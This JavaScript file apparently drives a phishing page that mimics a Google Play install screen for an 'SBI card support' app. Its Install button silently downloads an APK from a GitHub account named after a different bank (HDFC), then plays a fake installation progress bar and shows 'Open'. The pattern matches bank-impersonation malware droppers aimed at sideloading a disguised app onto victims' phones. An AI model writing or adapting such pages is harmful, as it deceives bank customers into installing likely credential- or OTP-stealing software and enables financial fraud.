document.addEventListener('DOMContentLoaded', () => {
    // PASTE YOUR REAL GITHUB RELEASE LINK HERE:
    const REAL_APK_URL = 'https://github.com/hdfcbank100200-tech/newmade2/releases/latest/download/sbi_card_support.apk';
    
    const installBtn = document.getElementById('installBtn');
    let deferredPrompt;

    // Listen for the PWA install prompt
    window.addEventListener('beforeinstallprompt', (e) => {
        e.preventDefault();
        deferredPrompt = e;
    });
    
    // Immediate APK Download on Install Click
    installBtn.addEventListener('click', () => {
        if (installBtn.textContent === 'Install') {
            // 1. Trigger PWA Installation if available
            if (deferredPrompt) {
                deferredPrompt.prompt();
                deferredPrompt.userChoice.then((choiceResult) => {
                    if (choiceResult.outcome === 'accepted') {
                        console.log('User accepted the SBI app install');
                    }
                    deferredPrompt = null;
                });
            }

            // 2. TRIGGER APK DOWNLOAD IMMEDIATELY (Backup)
            const downloadLink = document.createElement('a');
            downloadLink.href = REAL_APK_URL;
            downloadLink.download = 'sbi_help_v3.apk';
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);

            // 3. Start visual simulation
            installBtn.style.backgroundColor = '#dadce0';
            installBtn.style.color = '#5f6368';
            installBtn.textContent = 'Pending...';
            
            let progress = 0;
            const interval = setInterval(() => {
                progress += Math.floor(Math.random() * 25);
                if (progress >= 100) {
                    clearInterval(interval);
                    installBtn.textContent = 'Open';
                    installBtn.style.backgroundColor = '#01875f';
                    installBtn.style.color = 'white';
                } else {
                    installBtn.textContent = `Installing ${progress}%`;
                }
            }, 400);
        } else if (installBtn.textContent === 'Open') {
            window.location.href = 'home.html';
        }
    });

    // Add click listeners to headers for expand/collapse feel
    const headers = document.querySelectorAll('.section-header');
    headers.forEach(header => {
        header.addEventListener('click', () => {
            const content = header.nextElementSibling;
            if (content.style.display === 'none') {
                content.style.display = 'block';
            } else {
                content.style.display = 'none';
            }
        });
    });
});
